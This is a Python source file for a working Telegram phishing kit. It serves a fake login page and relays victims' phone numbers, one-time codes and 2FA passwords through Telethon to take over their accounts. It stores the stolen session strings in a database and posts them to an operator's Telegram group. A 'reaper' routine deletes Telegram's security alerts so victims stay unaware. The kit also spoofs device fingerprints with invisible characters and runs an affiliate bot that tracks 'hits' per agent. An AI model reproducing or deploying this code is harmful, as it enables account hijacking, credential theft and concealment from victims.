"""
VINZY ULTRA ENTERPRISE - VERSION 3.9.0 (TITANIUM GHOST EDITION)
--------------------------------------------------------------
Project: Vinzy Store Digital Services - Secure Management Node
Architecture: Asynchronous MTProto Ghost Hybrid with Deep-State Spoofing
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
Deployment: Koyeb / Heroku / Docker Containerized
Security Protocol: Zero-Trace Reaper + Unicode Fingerprinting
--------------------------------------------------------------
Developer: Vinzy Core Pro Engine
Status: Production Grade (2026 Stable)
"""

import os
import asyncio
import telebot
import psycopg2
from psycopg2 import pool
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone

# =========================================================================
# 1. GLOBAL ENVIRONMENT & CONFIGURATION LAYER
# =========================================================================

# Secure Credential Retrieval from Environment
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# Path Discovery for Template Engines
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FOLDER = os.path.join(BASE_DIR, "templates")

# INVISIBLE GHOST POOL (Updated v3.9)
# Strict removal of all "Vinzy" labels. Using high-authority device profiles.
# These profiles mimic official apps to bypass heuristic security filters.
GHOST_POOL = [
    {"model": "iPhone 15 Pro Max", "sys": "iOS 17.5.1", "app": "11.2.0"},
    {"model": "Samsung SM-S928B", "sys": "Android 14", "app": "11.1.2"},
    {"model": "iPad14,5", "sys": "iPadOS 17.4", "app": "10.9.0"},
    {"model": "\u200b", "sys": "\u200b", "app": "11.3.0"}, # Zero-Width Invisible
    {"model": "Pixel 8 Pro", "sys": "Android 14", "app": "11.0.1"},
    {"model": "\u2060", "sys": "\u2060", "app": "11.2.5"}, # Word-Joiner Invisible
    {"model": "iPhone 13", "sys": "iOS 16.6", "app": "10.0.1"},
    {"model": "MacBook Pro", "sys": "macOS 14.2", "app": "11.1.0"}
]

# Advanced Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][%(name)s]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Titanium_Core")

# Initialize Framework Objects
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="*")

# In-Memory Active Session Buffer
active_mirrors = {}

# =========================================================================
# 2. DATABASE CLUSTER & POOLING (NEON OPTIMIZED)
# =========================================================================

try:
    # Threaded pool handles high-concurrency hits without dropping connections
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=1,
        maxconn=30,
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("SYSTEM: Database Connection Pool established successfully.")
except Exception as e:
    logger.critical(f"FATAL ERROR: Could not connect to PostgreSQL - {e}")
    db_pool = None

def get_connection():
    """Retrieves a persistent connection with automated retry logic."""
    attempts = 0
    while attempts < 5:
        try:
            return db_pool.getconn()
        except:
            attempts += 1
            time.sleep(1)
    return None

def initialize_database_schema():
    """Constructs the Titanium data model for 2026 operations."""
    conn = get_connection()
    if not conn: return
    try:
        cur = conn.cursor()
        # Account Capture Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                username TEXT,
                tid BIGINT,
                device_info TEXT,
                hit_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'ACTIVE'
            )
        """)
        # Analytics Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        db_pool.putconn(conn)
        logger.info("SYSTEM: Schema synchronization complete.")
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")

initialize_database_schema()

# =========================================================================
# 3. GHOST REAPER & TRACE PURGE PROTOCOL
# =========================================================================

async def execute_ghost_reaper(client):
    """
    Titanium Reaper: Scans the service channel (777000) for security alerts.
    Targets: OTP Codes, New Login Notifications, Session Warnings.
    Timing: Executes within 500ms of capture.
    """
    try:
        logger.info("REAPER: Initiating deep-scan on Service Node 777000...")
        async for message in client.iter_messages(777000, limit=20):
            raw_text = (message.text or "").lower()
            
            # Expanded detection signature for 2026 alerts
            signatures = [
                "login code", "new login", "your code", 
                "detected", "authorized", "access to your account",
                "ip address", "location"
            ]
            
            if any(sig in raw_text for sig in signatures):
                await client.delete_messages(777000, [message.id])
                logger.info(f"REAPER: Successfully purged trace ID {message.id}")
                
        # Optional: Archive clear (Optional, comment out if not needed)
        # await client(functions.messages.DeleteHistoryRequest(peer=777000, max_id=0, just_clear=True, revoke=True))
        
    except Exception as e:
        logger.error(f"REAPER FAILURE: Unable to clear traces - {e}")

# =========================================================================
# 4. WEB API ENGINE & MTPROTO ORCHESTRATION
# =========================================================================

@app.route('/')
async def root_entry():
    """Direct entry point for target traffic."""
    return await send_from_directory(TEMPLATE_FOLDER, 'login.html')

@app.route('/step_phone', methods=['POST'])
async def api_handle_phone():
    """Phase 1: Session Initialization & OTP Trigger."""
    try:
        payload = await request.json
        raw_phone = str(payload.get('phone', ''))
        clean_phone = re.sub(r'\D', '', raw_phone)
        tid = int(payload.get('tid', 0))

        if not clean_phone or len(clean_phone) < 7:
            return jsonify({"status": "error", "msg": "Malformed phone number."})

        # Select Invisible Fingerprint
        ghost = random.choice(GHOST_POOL)
        
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH,
            device_model=ghost['model'],
            system_version=ghost['sys'],
            app_version=ghost['app']
        )
        
        await client.connect()

        # Update Metrics
        conn = get_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
                last_active = CURRENT_TIMESTAMP
            """, (tid,))
            conn.commit()
            cur.close()
            db_pool.putconn(conn)

        # Request Code
        sent_code = await client.send_code_request(clean_phone)
        
        # Buffer session in memory
        active_mirrors[clean_phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "tid": tid,
            "device": ghost['model'],
            "ts": time.time()
        }
        
        logger.info(f"CAPTURED-PH: {clean_phone} | Agent: {tid}")
        return jsonify({"status": "success"})

    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood Limit: Wait {e.seconds}s"})
    except Exception as e:
        logger.error(f"API_PHONE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Internal Server Error"})

@app.route('/step_code', methods=['POST'])
async def api_handle_code():
    """Phase 2: Code Injection & Verification."""
    try:
        payload = await request.json
        phone = re.sub(r'\D', '', str(payload.get('phone', '')))
        otp = payload.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Handshake expired."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
            return await finalize_capture_sequence(phone)
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except Exception as e:
            return jsonify({"status": "error", "msg": "Invalid verification code."})
            
    except Exception as e:
        return jsonify({"status": "error", "msg": "Verification failed."})

@app.route('/step_2fa', methods=['POST'])
async def api_handle_2fa():
    """Phase 3: Security Bypass (2FA)."""
    try:
        payload = await request.json
        phone = re.sub(r'\D', '', str(payload.get('phone', '')))
        pwd = payload.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session lost."})

        client = active_mirrors[phone]['client']
        
        try:
            await client.sign_in(password=pwd)
            return await finalize_capture_sequence(phone)
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Incorrect 2FA password."})
            
    except Exception as e:
        return jsonify({"status": "error", "msg": "Bypass failed."})

async def finalize_capture_sequence(phone):
    """Phase 4: Data Extraction, Trace Purge, and Notification."""
    try:
        data = active_mirrors.get(phone)
        client = data['client']
        tid = data['tid']
        
        # 1. RUN REAPER IMMEDIATELY
        await execute_ghost_reaper(client)
        
        # 2. EXTRACT CORE DATA
        me = await client.get_me()
        session_str = client.session.save()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
        alias = f"@{me.username}" if me.username else "None"
        
        # 3. PERSISTENCE LAYER
        conn = get_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_info) 
                VALUES (%s, %s, %s, %s, %s, %s) 
                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string, hit_date = CURRENT_TIMESTAMP
            """, (phone, session_str, full_name, alias, tid, data['device']))
            cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
            conn.commit()
            cur.close()
            db_pool.putconn(conn)

        # 4. DISPATCH DATA CARD
        hit_card = (
            f"💠 <b>TITANIUM HIT CAPTURED</b> 💠\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {full_name}\n"
            f"🏷 <b>Username:</b> {alias}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent ID:</b> <code>{tid}</code>\n"
            f"📱 <b>Spoof:</b> {data['device']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        
        bot.send_message(LOGGER_GROUP, hit_card)
        if tid != 0:
            bot.send_message(tid, f"✅ <b>Hit Secured!</b>\nTarget <b>{full_name}</b> captured and traces purged.")

        # Cleanup
        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]
        return jsonify({"status": "success"})

    except Exception as e:
        logger.error(f"FINALIZATION ERROR: {e}")
        return jsonify({"status": "error", "msg": "Capture sync failed."})

# =========================================================================
# 5. AGENT BOT COMMAND INTERFACE - [FIXED CONTEXT VERSION]
# =========================================================================

@bot.message_handler(commands=['start'])
def handle_start(m):
    """Agent Onboarding Sequence."""
    welcome = (
        f"<b>Vinzy Titanium Enterprise v3.9.0</b>\n"
        f"<i>2026 Ghost Ops Architecture</i>\n\n"
        f"<b>Status:</b> 🟢 Operational\n"
        f"<b>Agent TID:</b> <code>{m.from_user.id}</code>\n"
        f"<b>Location:</b> Phnom Penh Node 01"
    )
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 My Link", "📊 My Stats", "🛠 Support", "📜 Docs")
    bot.send_message(m.chat.id, welcome, reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def handle_link(m):
    """Dynamic Link Generation - Fixed for Background Threading."""
    # Priority 1: Check Environment Variable (Koyeb/Heroku)
    # Priority 2: Fallback to a hardcoded string if ENV is missing
    domain = os.environ.get("DOMAIN", "your-app-name.koyeb.app")
    
    # Ensure protocol is handled
    if not domain.startswith("http"):
        base_url = f"https://{domain}"
    else:
        base_url = domain

    agent_link = f"{base_url}/?id={m.from_user.id}"
    
    msg = (
        f"🚀 <b>Your Unique Link:</b>\n"
        f"<code>{agent_link}</code>\n\n"
        f"<b>Features:</b>\n"
        f"• Invisible Trace Purge\n"
        f"• High-Speed 2FA Bypass\n"
        f"• Zero-Width Spoofing"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def handle_stats(m):
    """Real-time performance metrics."""
    conn = get_connection()
    if not conn: 
        bot.send_message(m.chat.id, "❌ Database connection failed.")
        return
    try:
        cur = conn.cursor()
        cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
        row = cur.fetchone()
        cur.close()
        db_pool.putconn(conn)
        
        clicks, hits = (row[0], row[1]) if row else (0, 0)
        conversion = round((hits/clicks)*100, 1) if clicks > 0 else 0
        
        stats_msg = (
            f"📊 <b>Agent Performance</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🖱 <b>Clicks:</b> {clicks}\n"
            f"🎯 <b>Hits:</b> {hits}\n"
            f"📈 <b>Conversion:</b> {conversion}%\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(m.chat.id, stats_msg)
    except Exception as e:
        logger.error(f"STATS_ERR: {e}")
        bot.send_message(m.chat.id, "❌ Error retrieving stats.")

# =========================================================================
# 6. SYSTEM RUNTIME & BOOTLOADER
# =========================================================================

def bot_polling_thread():
    """Maintains bot connectivity with failover logic."""
    logger.info("BOOT: Launching Bot Polling Service...")
    try:
        bot.remove_webhook()
    except:
        pass
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            logger.error(f"POLLING ERROR: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # 1. Start Bot Polling in background
    Thread(target=bot_polling_thread, daemon=True).start()
    
    # 2. Launch Web Infrastructure
    logger.info("BOOT: Vinzy Titanium Node operational on Port 8000")
    server_port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=server_port, use_reloader=False)

# -------------------------------------------------------------------------
# END OF SYSTEM CORE - VINZY ULTRA v3.9.0
# -------------------------------------------------------------------------
